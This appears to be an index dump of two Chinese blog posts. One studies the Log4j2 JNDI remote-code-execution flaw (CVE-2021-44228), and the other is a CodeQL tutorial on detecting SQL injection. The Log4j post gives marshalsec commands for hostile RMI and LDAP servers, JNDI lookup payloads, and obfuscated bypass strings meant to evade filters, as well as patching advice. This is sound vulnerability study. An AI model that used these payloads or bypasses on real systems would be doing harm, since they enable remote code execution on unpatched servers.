[{"categories":["Java"],"content":"Log4j2（CVE-2021-44228）\r","date":"2025-04-13","objectID":"/posts/cde7a8a/:1:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"前言\r没学 java 就知道这个漏洞，应该还有不少的解析和绕过，这里就简单先了解下最基础的 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:2:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"简介\rlog4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。 其被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。在java中最常用的日志框架是log4j2和logback，其中log4j2支持lookup功能（看到这个就知道要打 jndi ）。例如当开发者想在日志中打印今天的日期，则只需要输出${data:MM-dd-yyyy}，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。究其根本，还是最后调用触发了 jndi ","date":"2025-04-13","objectID":"/posts/cde7a8a/:3:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"影响版本\r2.0 \u003c= Apache log4j2 \u003c= 2.14.1 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:4:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"环境搭建\rpom.xml \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.12\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e 再写个xml文件来实现log4j2（yaml等文件也行），默认文件名为log4j2.xml，放在 src/main/resources 目录下 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!-- log4j2 配置文件 --\u003e \u003c!-- 日志级别 trace\u003cdebug\u003cinfo\u003cwarn\u003cerror\u003cfatal --\u003e\u003cconfiguration status=\"info\"\u003e \u003c!-- 自定义属性 --\u003e \u003cProperties\u003e \u003c!-- 日志格式(控制台) --\u003e \u003cProperty name=\"pattern1\"\u003e[%-5p] %d %c - %m%n\u003c/Property\u003e \u003c!-- 日志格式(文件) --\u003e \u003cProperty name=\"pattern2\"\u003e =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n \u003c/Property\u003e \u003c!-- 日志文件路径 --\u003e \u003cProperty name=\"filePath\"\u003elogs/myLog.log\u003c/Property\u003e \u003c/Properties\u003e \u003cappenders\u003e \u003cConsole name=\"Console\" target=\"SYSTEM_OUT\"\u003e \u003cPatternLayout pattern=\"${pattern1}\"/\u003e \u003c/Console\u003e \u003cRollingFile name=\"RollingFile\" fileName=\"${filePath}\" filePattern=\"logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz\"\u003e \u003cPatternLayout pattern=\"${pattern2}\"/\u003e \u003cSizeBasedTriggeringPolicy size=\"5 MB\"/\u003e \u003c/RollingFile\u003e \u003c/appenders\u003e \u003cloggers\u003e \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"Console\"/\u003e \u003cappender-ref ref=\"RollingFile\"/\u003e \u003c/root\u003e \u003c/loggers\u003e\u003c/configuration\u003e 最后写个demo来触发 package com.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class test { public static void main(String[] args) { Logger logger = LogManager.getLogger(LongFunction.class); String username = \"admin123\"; if (username != null ) { logger.info(\"User {} login in!\", username); } else { logger.error(\"User {} not exists\", username); } } } 可以看到是将登录信息记录到了 myLog.log 中 上面说过了 log4j2 会把 ${} 包裹的进行特殊处理，最后会触发 lookup，以下是一些常见的 lookup 类型 ${date}：获取当前日期和时间，支持自定义格式。 ${pid}：获取当前进程的 ID。 ${logLevel}：获取当前日志记录的级别。 ${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。 ${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。 ${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。 ${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。 ${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。 比如 ${date} ","date":"2025-04-13","objectID":"/posts/cde7a8a/:5:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"漏洞分析\r先打下，用marshalsec起个恶意的rmi服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://127.0.0.1:9999/#exp\" 9991 ldap 也是这样 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:9999/#exp\" 1099 打个断点调试，来到 org.apache.logging.log4j.core.layout.PatternLayout 下的 toSerializable 方法 这个类中有两个 toSerializable 方法，由于我们在 log4j2.xml 中是使用 \u003cPatternLayout pattern=\"${pattern1}\"/\u003e 这种静态的配置方式，所以最后会调用到第二个 toSerializable 方法中的 this.formatters.length 来获取 ，这个类的源码 public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) { int len = this.formatters.length; for(int i = 0; i \u003c len; ++i) { this.formatters[i].format(event, buffer); } if (this.replace != null) { String str = buffer.toString(); str = this.replace.format(str); buffer.setLength(0); buffer.append(str); } return buffer; } 这个类就是将日志内容按 log4j2.xml 文件中规定好的格式那样输出，我们这里的格式为 [%-5p] %d %c - %m%n 所以第七次循环就会处理 %m 也就是我们的日志消息，会调用到 org.apache.logging.log4j.core.pattern.MessagePatternConverter#format 这里的 this.config 就是我们实现log4j2的文件类型，这里是xml，this.noLookups 为 false 则代表启用 ${} 变量替换，这里我们没有在xml中显式规定禁用，所以默认是启用的，而且我们这里本来就需要用到变量替换 然后进入到 if 语句里面，如果检测到 ${ 开头，则取出从 offset 到当前 workingBuilder 末尾的内容，故这里 value 的值就为当时输入的值 然后调用 replace() ，又调用 substitute()，最后会调用到 org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable，这里的调用栈 resolveVariable:1106, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) 其源码 protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) { StrLookup resolver = this.getVariableResolver(); return resolver == null ? null : resolver.lookup(event, variableName); } resolver解析时支持的关键词有[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]，而我们这里利用的jndi:xxx后续就会用到JndiLookup这个解析器，调用栈 lookup:55, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) 最后调用到log4j2原生的 lookup() 方法 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:6:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"绕过其防御\r先是绕过 递归解析绕过：log4j2 支持表达式递归解析，下面的表达式会逐层解析，由于 :-是键值对的分隔符，而表达式只管取值，从而使得 {::-j} -\u003e j，类似的可以混淆其他字符。 loggr.info(\"${${::-j}ndi:ldap://127.0.0.1:1099/exp}\"); logger.info(\"${${,:-j}ndi:ldap://127.0.0.1:1099/exp}\") lowwer / upper 绕过：使用 log4j2 支持的关键字，实现大小写绕过 logg.info(\"${${lower:J}ndi:ldap://127.0.0.1:1099/exp}\"); 防御 先是最简单的，更新到最新版本或者安全版本，比如 2.15.0-rc2 安全版本，并确认不开启 JNDI Lookup ，还有些临时应急操作，比如 jvm 添加 -Dlog4j2.formatMsgNoLookups=true 参数（使得noLookup为true，不会进入到lookup中） ","date":"2025-04-13","objectID":"/posts/cde7a8a/:7:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"总结\r调用栈 lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2034, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi) info:1444, AbstractLogger (org.apache.logging.log4j.spi) main:16, test (com.example) sink 点是 lo4j2 包下的 JndiManager#lookup 简单分析下后觉得确实无敌，这么刁钻的角度都能找到，这个漏洞的原理和利用都不难，但从source 分析调用到最后的sink点，真的很强，不愧是阿里，听说是codeql找到的，也不知道是不是真的，但用codeql应该轻松不少 还有更多的绕过和修复，以及更深的利用分析，可以见su18师傅的文章：https://tttang.com/archive/1378/#toc_rc1 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:8:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"参考\rhttps://gaorenyusi.github.io/posts/log4j2/ https://jaspersec.top/posts/1237655284.html https://tttang.com/archive/1378/ ","date":"2025-04-13","objectID":"/posts/cde7a8a/:9:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"前言\rCodeQL 不多说，帮助我们进行代码审计的一个挺好的工具 ","date":"2025-04-13","objectID":"/posts/28dc684/:1:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"CodeQL 安装\rCodeQL本身包含两部分解析引擎+SDK。 解析引擎用来解析我们编写的规则，虽然不开源，但是我们可以直接在官网下载二进制文件直接使用。 SDK完全开源，里面包含大部分现成的漏洞规则，我们也可以利用其编写自定义规则。 ","date":"2025-04-13","objectID":"/posts/28dc684/:2:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"引擎安装\r去地址：https://github.com/github/codeql-cli-binaries/releases 下载已经编译好的codeql执行程序，解压之后把codeql文件夹放入～/CodeQL，我这里是 windows ，下的是 codeql-win64.zip 为了方便测试我们需要把ql可执行程序加入到环境变量当中： setx PATH \"E:\\CodeQL\\codeql;%PATH%\" 然后重开个cmd输入 codeql，出现如下图就说明引擎设置完成 ","date":"2025-04-13","objectID":"/posts/28dc684/:2:1","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"SDK安装\r在这边下载规则库文件https://github.com/github/codeql，用来在后续库中进行查询 将解压后的文件放入~/CodeQL中，之后输入codeql pack ls来查看当前SDK中支持的规则集。 ","date":"2025-04-13","objectID":"/posts/28dc684/:2:2","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"VSCode开发插件安装\r在 vscode 中安装 CodeQL 插件 然后在该插件的设置中设置 codeql 的可执行文件路径（路径中最好不要有中文） 然后就设置好了，接下来写个demo测试一下 ","date":"2025-04-13","objectID":"/posts/28dc684/:2:3","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"demo\r由于CodeQL的处理对象并不是源码本身，而是中间生成的AST结构数据库，所以我们先需要把我们的项目源码转换成CodeQL能够识别的CodeDatabase。 切换到源代码所在的目录然后再执行创建数据库的命令 codeql database create \u003c数据库名\u003e --language=\u003c语言标识符\u003e --source-root=\u003c源码路径\u003e 如果源代码是一个Maven项目，可能需要使用Maven命令来构建项目，并在创建数据库时指定该命令 --command=\"mvn clean install\" 不同的 language 所对应的语言标识符 Language Identity C/C++ cpp C# csharp Go go Java java javascript/Typescript javascript Python python 这里我主要是用 codeql 来审计 java 代码，所以用 micro_service_seclab 这个靶场来做测试 codeql database create micro_service_seclab_database --language=\"java\" --command=\"mvn clean install -Dmaven.test.skip=true\" --source-root=E:\\CodeQL\\test\\micro_service_seclab 稍微解释下，在当前目录下创建个 micro_service_seclab_database 当作存放数据库的目录，指定语言为java，然后写出构建和清楚命令，最后指定源代码跟目录 然后在这里把生成的 micro_service_seclab_database 添加进去 然后出现这个就表示数据库加载成功了 接着再添加CodeQL SDK：“文件”-“将文件夹添加到工作区” 然后在 sdk/java/ql 目录下创建个 demo.ql 查询文件，然后 Run Query on Selected Database，就会打印 heloooo test ","date":"2025-04-13","objectID":"/posts/28dc684/:3:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"基本语法\r以上面的靶场为例 可以看到 CodeQL 引擎的作用就是帮我们把源码转换为 CodeQL 能识别的数据库，所以我们能做的就是编写 QL 规则，再通过其引擎来运行我们的规则，这样就可以达到一个自动审计的功能 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"QL语法\rimport java from int i where i = 1 select i 第一行表示我们要引入CodeQL的类库，这里我们以 java 为例 from int i，表示我们定义一个变量i，它的类型是int，表示我们获取所有的int类型的数据 where i = 1, 表示当i等于1的时候，符合条件 select i，表示输出i 如果QL文件在 sdk\\java\\ql\\ 目录中时就不需要 import java 了，因为这是 CodeQL 标准库目录，其会自动隐式加载该目录下的依赖，但如果写在其他目录下就需要手动 import java ，包括其子目录 这里我是写在 sdk\\java\\ql\\examples 下的，上面的代码很好理解，所有int类型的数据中筛选出为1的情况，输出就是 1 QL查询的语法结构为： from [datatype] var where condition(var = something) select var 从上面的例子中我们发现完整的QL语法无非就分三部分，先是限定一个查询的区域，然后写出过滤规则，最后输出 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:1","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"类库\r上面我们说了CodeQL引擎会将代码转换为数据库，这个数据库其实就是可识别的AST数据库 在AST里面Method代表的就是类当中的方法；比如说我们想过的所有的方法调用，MethodAccess获取的就是所有的方法调用。 我们经常会用到的ql类库大体如下： 名称 解释 Method 方法类，Method method表示获取当前项目中所有的方法 MethodAccess 方法调用类，MethodAccess call表示获取当前项目当中的所有方法调用 Parameter 参数类，Parameter表示获取当前项目当中所有的参数 结合ql的语法，我们尝试获取micro-service-seclab项目当中定义的所有方法： import java from Method kkk select kkk 然后添加下过滤条件，筛选出名字为 getStudent 的方法名称 import java from Method k where k.hasName(\"getStudent\") select k.getName(), k.getDeclaringType() k.hashName() 判断名字是否匹配 k.getName() 获取的是当前方法的名称 k.getDeclaringType() 获取的是当前方法所属class的名称 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:2","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"谓词\r如果限制条件比较多，where 语句就会很冗长。CodeQL提供一种机制可以帮助我们把很长的查询语句封装成函数，而这个函数，就叫谓词。 比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的： import java predicate isStudent(Method k) { k.getName()=\"getStudent\" } from Method k where isStudent(k) select k.getName(), k.getDeclaringType() predicate 表示当前方法没有返回值。 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:3","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"设置Source和Sink\r什么是source和sink 在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer) source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它) sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer，也就是waf 只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。 设置Source 在CodeQL中我们通过以下方法来设置Source override predicate isSource(DataFlow::Node src) {} 在这个靶场中，我们使用的是Spring Boot框架，那么source就是http参数入口的代码参数，比如在下面的代码中，source就是username： @RequestMapping(value = \"/one\") public List\u003cStudent\u003e one(@RequestParam(value = \"username\") String username) { return indexLogic.getStudent(username); } 本例中我们设置Source的代码为： override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } RemoteFlowSource 是 CodeQL 标准库中预定义的 “远程数据源” 类，比如HTTP 请求参数，用户输入以及其他外部输入等都是 这是SDK自带的规则，里面包含了大多常用的Source入口。我们使用的SpringBoot也包含在其中，可以直接使用。 注: instanceof 语法是CodeQL提供的语法，后面在CodeQL进阶部分会提到，这里就是检查获得的 src 是否为 RemoteFlowSource 设置Sink 在CodeQL中我们通过以下方法来设置Sink override predicate isSink(DataFlow::Node sink) {} 在实际中，我们最后都是触发到某个恶意方法，如 getter，setter，所以 sink 应该是个方法，假设我们这里的sink 点是个query方法(Method)的调用(MethodAccess)，所以我们设置Sink为： override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } 这里我们使用了exists子查询，这个是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。 sink.asExpr() = call.getArgument(0)：将 sink 节点转换为表达式，并检查它是否等于 call 的第一个参数 故上面sink语句的作用是查找一个query()方法的调用点，并把它的第一个参数设置为sink 在靶场系统(micro-service-seclab)中，sink为 jdbcTemplate.query(sql, ROW_MAPPER); 当刚才设置的source变量流入这个方法时，说明注入点和触发点是通的，就能产生注入漏洞 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:4","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"Flow数据流\r设置好Source和Sink，就相当于搞定了首尾，接下来就是疏通中间的利用链。一个受污染的变量，能够毫无阻拦的流转到危险函数，就表示存在漏洞 这个连通工作就是CodeQL引擎本身来完成的。我们通过使用config.hasFlowPath(source, sink)方法来判断是否连通。 比如如下代码： from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" 我们传递给config.hasFlowPath(source, sink)我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。 source.getNode()：获取源节点的底层语法树节点（AST Node），显示漏洞源头在代码中的具体位置 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:5","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"代码测试\r","date":"2025-04-13","objectID":"/posts/28dc684/:5:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"初步检测\r综上，可以写个 ql 查询代码来检测 sql 注入漏洞 /** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\"} override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" CodeQL 在定义类上的语法和 Java 类似，其中 extends 的父类 TaintTracking::Configuration 是官方提供用来做数据流分析的通用类，提供很多数据流分析相关的方法，比如isSource(定义source)，isSink(定义sink) src instanceof RemoteFlowSource 表示src 必须是 RemoteFlowSource 类型。在RemoteFlowSource里，官方提供很非常全的source定义，我们本次用到的Springboot的Source就已经涵盖了。 注：上面的注释和其它语言是不一样的，不能够删除，它是程序的一部分，因为在我们生成测试报告的时候，上面注释当中的name，description等信息会写入到审计报告中。 这里的isSource 和isSink 根据自己需要进行重写，而判断中间是否疏通可以使用CodeQL提供的config.hasFlowPath(source, sink)来帮我们处理 可以看到真的很方便，直接把source处和整个从source到sink的链子都显示出来了 这里爆警告说是 DataFlow::PathGraph 在新版本中被弃用了，所以这段代码只能在低版本的规则库里跑 这里开头有 @kind path-problem ，说明结果至少是4列，写了这个结果就会输出完整的污点传播路径，除此之外对输出还有其他要求，比如每列要输出的类型也有要求，但是我这 source.getNode(),source, sink,\"source\" 就能正常输出，source, sink,source.getNode(),\"source\" 却是啥也没有 ","date":"2025-04-13","objectID":"/posts/28dc684/:5:1","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"误报分析\r我们可以看到有一处的 sql 注入，其输入的参数类型为 List\u003cLong\u003e ，不可能存在注入 这里说明我们给的限制并未严格要求参数类型，就会导致以上的误报产生，我们可以用 isSanitizer 来避免这种情况 isSanitizer是CodeQL的类TaintTracking::Configuration提供的净化方法。它的函数原型是： override predicate isSanitizer(DataFlow::Node node) {} 在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断 override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType } 表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在，可以看到这里默认规则只是一些基础类型，没有类似 List\u003clong\u003e 等的复合类型 我们将 TaintTracking::Configuration 中的 isSanitizer 重写下就好了 override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) // 这里的 ParameterizedType 代表所有泛型，判断泛型当中的传参是否为 Number 型 } 这样在检测到 List\u003clong\u003e 时就会将其净化掉，这样链子就不通了，也就不会出现误报的情况 ","date":"2025-04-13","objectID":"/posts/28dc684/:5:2","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"漏报补充\r我们发现如下 sql 注入没有被捕捉到（参考文章是这样写的，但我这是捕捉到了的） public List\u003cStudent\u003e getStudentWithOptional(Optional\u003cString\u003e username) { String sqlWithOptional = \"select * from students where username like '%\" + username.get() + \"%'\"; //String sql = \"select * from students where username like ?\"; return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER); } 宁可错杀一百不可放过一个，在代码审计中是如此，误报可能需要花费时间去筛选，但是漏报的损失则无法挽回 在 CodeQL 中，我们可以通过 isAdditionalTaintStep 方法来将断了的节点给它强制连接上 isAdditionalTaintStep 方法是CodeQL的类TaintTracking::Configuration提供的的方法，它的原型是： override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {} 它的作用是将一个可控节点，比如A强制传递给另外一个节点B，那么节点B也就成了可控节点。 假设这里是 username.get() 这一步断掉了，我们可以强制让 username 流转到 username.get() ，代码为 /** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph predicate isTaintedString(Expr expSrc, Expr expDest) { exists(Method method, MethodAccess call, MethodAccess call1 | expSrc = call1.getArgument(0) and expDest=call and call.getMethod() = method and method.hasName(\"get\") and method.getDeclaringType().toString() = \"Optional\u003cString\u003e\" and call1.getArgument(0).getType().toString() = \"Optional\u003cString\u003e\" ) } class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\" } override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { isTaintedString(node1.asExpr(), node2.asExpr()) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" expSrc = call1.getArgument(0)：规定了污染源为第一个参数 expDest = call and call.getMethod() = method and method.hasName(\"get\")：规定了污染目标为 xxx.get() method.getDeclaringType().toString() = \"Optional\u003cString\u003e\" and call1.getArgument(0).getType().toString() = \"Optional\u003cString\u003e\" ：规定了污染源和污染目标的类型为Optional\u003cString\u003e ","date":"2025-04-13","objectID":"/posts/28dc684/:5:3","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"Lombok问题解决\rLombok是一个非常有名的Java类库，在开发中应该经常遇到，它通过简单的注解来帮助我们简化消除一些必须有但显得很臃肿的Java代码的工具，比如我们可以不用编写 getter，setter demo public class Student { private int id; private String username; public void setId(int id) { this.id = id; } public int getId() { return id; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } } 当我们使用 Lombok 的注解，就不需要手动编写 getter 和 setter，以下代码等同于上面的 demo import lombok.Data; @Data public class Student { private int id; private String username; private int sex; private int age; } 可以看到用了 lombok 注解后就没有了 getter 和 setter，这就会导致 CodeQL 不能正常检测，source 到 sink 的链条断裂，从而造成漏报 有两种解决办法，第一种是在 pom.xml 中加入依赖，再重新编译即可 \u003cbuild\u003e \u003csourceDirectory\u003etarget/generated-sources/delombok\u003c/sourceDirectory\u003e \u003ctestSourceDirectory\u003etarget/generated-test-sources/delombok\u003c/testSourceDirectory\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok-maven-plugin\u003c/artifactId\u003e \u003cversion\u003e1.18.20.0\u003c/version\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cid\u003edelombok\u003c/id\u003e \u003cphase\u003egenerate-sources\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003edelombok\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003caddOutputDirectory\u003efalse\u003c/addOutputDirectory\u003e \u003csourceDirectory\u003esrc/main/java\u003c/sourceDirectory\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003cexecution\u003e \u003cid\u003etest-delombok\u003c/id\u003e \u003cphase\u003egenerate-test-sources\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003etestDelombok\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003caddOutputDirectory\u003efalse\u003c/addOutputDirectory\u003e \u003csourceDirectory\u003esrc/test/java\u003c/sourceDirectory\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003c/executions\u003e \u003c/plugin\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-maven-plugin\u003c/artifactId\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e 第二种是有人在 issue 中提出的：https://github.com/github/codeql/issues/4984 # get a copy of lombok.jar wget https://projectlombok.org/downloads/lombok.jar -O \"lombok.jar\" # run \"delombok\" on the source files and write the generated files to a folder named \"delombok\" java -jar \"lombok.jar\" delombok -n --onlyChanged . -d \"delombok\" # remove \"generated by\" comments find \"delombok\" -name '*.java' -exec sed '/Generated by delombok/d' -i '{}' ';' # remove any left-over import statements find 